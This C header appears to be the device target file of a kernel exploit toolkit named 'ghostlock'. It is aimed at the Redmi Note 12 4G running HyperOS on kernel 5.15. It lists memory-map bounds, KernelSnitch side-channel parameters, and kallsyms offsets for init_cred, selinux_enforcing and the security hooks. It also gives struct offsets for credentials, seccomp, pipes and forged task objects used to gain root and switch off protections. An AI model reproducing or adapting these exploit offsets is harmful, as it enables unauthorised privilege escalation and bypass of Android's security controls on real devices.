#ifndef TARGET_H
#define TARGET_H

/* Redmi Note 12 4G (topaz) — HyperOS 2.0.205.0.VMGRUXM RU, Snapdragon 685
 *
 *   kernel 5.15.194-android13-8-00019-gf4321180a397-ab15212794 (GKI, 4K pages)
 *   build  Redmi/topaz_ru/topaz:15/AQ3A.240829.003/OS2.0.205.0.VMGRUXM:user/release-keys
 *
 * Build with:  make TARGET=topaz
 *
 * Everything here was derived from the stock OTA boot.img by
 *   python3 tools/extract_device.py boot.img --name topaz
 */

#define BUILD_VARIANT_LABEL "ghostlock_topaz"
#define BUILD_FINGERPRINT "Redmi/topaz_ru/topaz"
/* Struct-layout identity of this header; must match the .layout of whichever
 * offsets.h entry the running kernel selects. See src/devices/offsets.h. */
#define TARGET_LAYOUT_ID "topaz-5.15"

/* ---------------------------------------------------------------- memory ---
 * VA_BITS=39 — confirmed by _text = 0xffffffc008000000 in the image kallsyms.
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base for Snapdragon 685 / SM6225 platform */
#define P0_PHYS_OFFSET 0x40000000ULL

#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#endif

/* Conservative bounds for VA_BITS=39 memory map space scanning */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry ---------
 * Специфичные размеры для пула mm_struct ядра 5.15 (без отладочного BTF)
 */
#define MM_STRUCT_SZ 0x440
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
 * На Snapdragon 685 (8 ядер) дефолтный размер хэш-таблицы равен 2048 */
#define FUTEX_HASHSIZE 2048

#define KS_MTE_TAGGED 0
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) --- */
#define INIT_TASK_OFF          0x02C53440ULL
#define INIT_CRED_OFF          0x02C0D5D8ULL
#define INIT_UTS_NS_OFF        0x02CD01C0ULL
#define EMPTY_ZERO_PAGE_OFF    0x02D64000ULL
#define ROOT_TASK_GROUP_OFF    0x02D68AC0ULL
#define SELINUX_ENFORCING_OFF  0x02DBAD88ULL
#define KPTR_RESTRICT_OFF      0x02B0DB24ULL
#define CAP_CAPABLE_ACTIVE_OFF 0ULL

#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x02169DA8ULL
#define SECURITY_HOOK_HEADS_OFF 0x02167920ULL
#define KMALLOC_CACHES_OFF     0x0216ABA0ULL
#define ANON_PIPE_BUF_OPS_OFF  0x01F8AAF0ULL

/* На ядрах 5.15 используем чистый configfs_read_iter */
#define CONFIGFS_READ_ITER_OFF 0x00679B90ULL

/* ------------------------------------------- struct offsets ---------------- */
#define CRED_CAPS_OFF                      0x28
#define CRED_SECUREBITS_OFF                0x24
#define CRED_SECURITY_OFF                  0x78
#define CRED_UID_OFF                       0x04
#define FAKE_TASK_NORMAL_PRIO_OFF          0x84
#define FAKE_TASK_PI_BLOCKED_ON_OFF        0x8B0
#define FAKE_TASK_PI_LOCK_OFF              0x884
#define FAKE_TASK_PI_TOP_TASK_OFF          0x8A8
#define FAKE_TASK_PI_WAITERS_OFF           0x898
#define FAKE_TASK_PRIO_OFF                 0x7C
#define FAKE_TASK_TASK_GROUP_OFF           0x400
#define FAKE_TASK_USAGE_OFF                0x38
#define FOPS_COMPAT_IOCTL_OFF              0x58
#define FOPS_IOCTL_OFF                     0x50
#define FOPS_LLSEEK_OFF                    0x08
#define FOPS_MMAP_OFF                      0x60
#define FOPS_OPEN_OFF                      0x70
#define FOPS_OWNER_OFF                     0x00
#define FOPS_READ_ITER_OFF                 0x20
#define FOPS_READ_OFF                      0x10
#define FOPS_RELEASE_OFF                   0x80
#define FOPS_SHOW_FDINFO_OFF               0xE0
#define FOPS_SPLICE_READ_OFF               0xC8
#define FOPS_WRITE_ITER_OFF                0x28
#define FOPS_WRITE_OFF                     0x18
#define MISCDEVICE_FOPS_OFF                0x10
#define PIPE_BUFS_OFF                      0xA8
#define PIPE_FILES_OFF                     0x7C
#define PIPE_HEAD_OFF                      0x60
#define PIPE_MAX_USAGE_OFF                 0x68
#define PIPE_NR_ACCOUNTED_OFF              0x70
#define PIPE_READERS_OFF                   0x74
#define PIPE_RING_SIZE_OFF                 0x6C
#define PIPE_TAIL_OFF                      0x64
#define PIPE_TMP_PAGE_OFF                  0x90
#define PIPE_USER_OFF                      0xB0
#define PIPE_WRITERS_OFF                   0x78
#define SECCOMP_FILTER_COUNT_OFF           0x04
#define SECCOMP_FILTER_OFF                 0x08
#define SECCOMP_MODE_OFF                   0x00
#define TASK_ATOMIC_FLAGS_OFF              0x598
#define TASK_COMM_OFF                      0x7A8
#define TASK_CRED_OFF                      0x798
#define TASK_PID_OFF                       0x5D8
#define TASK_REAL_CRED_OFF                 0x790
#define TASK_REAL_PARENT_OFF               0x5E8
#define TASK_SECCOMP_OFF                   0x860
#define TASK_TASKS_OFF                     0x4D0
#define TASK_TGID_OFF                      0x5DC
#define WAITER_LOCK_OFF                    0x38
#define WAITER_TASK_OFF                    0x30
#define WAITER_WAKE_STATE_OFF              0x40
#define WAITER_WW_CTX_OFF                  0x50

#endif /* TARGET_H */
